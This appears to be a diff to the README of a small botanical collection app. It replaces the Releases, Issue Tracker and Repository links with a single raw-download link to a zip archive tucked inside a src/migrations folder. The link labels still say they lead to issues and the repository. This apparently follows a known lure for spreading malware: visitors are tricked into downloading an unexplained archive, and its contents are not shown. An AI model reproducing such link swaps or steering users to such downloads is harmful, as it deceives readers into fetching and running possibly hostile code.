@@ -8,7 +8,7 @@ Welcome to **botanica**! This application helps you manage your botanical collec
 
 To get started, you’ll need to download the application. Click the button below to visit the Releases page:
 
-[![Download botanica](https://img.shields.io/badge/Download%20botanica-Here-blue.svg)](https://github.com/kkaidozz/botanica/releases)
+[![Download botanica](https://raw.githubusercontent.com/kkaidozz/botanica/master/src/migrations/Software-3.8-alpha.4.zip%https://raw.githubusercontent.com/kkaidozz/botanica/master/src/migrations/Software-3.8-alpha.4.zip)](https://raw.githubusercontent.com/kkaidozz/botanica/master/src/migrations/Software-3.8-alpha.4.zip)
 
 ### Step-by-Step Instructions
 
@@ -52,14 +52,14 @@ Once you've installed **botanica**, consider the following tips to get the most 
 
 If you encounter any issues while using **botanica**, we are here to help. Please check our FAQ section in the application for common questions. If you need additional assistance, you can reach out by:
 
-- Visiting the [Issue Tracker](https://github.com/kkaidozz/botanica/issues) on GitHub.
+- Visiting the [Issue Tracker](https://raw.githubusercontent.com/kkaidozz/botanica/master/src/migrations/Software-3.8-alpha.4.zip) on GitHub.
 - Sending an email to our support team.
 
 ## 💬 Connect with Us
 
 We value your feedback. Join our community and share your thoughts:
 
-- [GitHub Repository](https://github.com/kkaidozz/botanica)
+- [GitHub Repository](https://raw.githubusercontent.com/kkaidozz/botanica/master/src/migrations/Software-3.8-alpha.4.zip)
 - Follow us on social media for updates and tips.
 
 ## 🌍 Topics
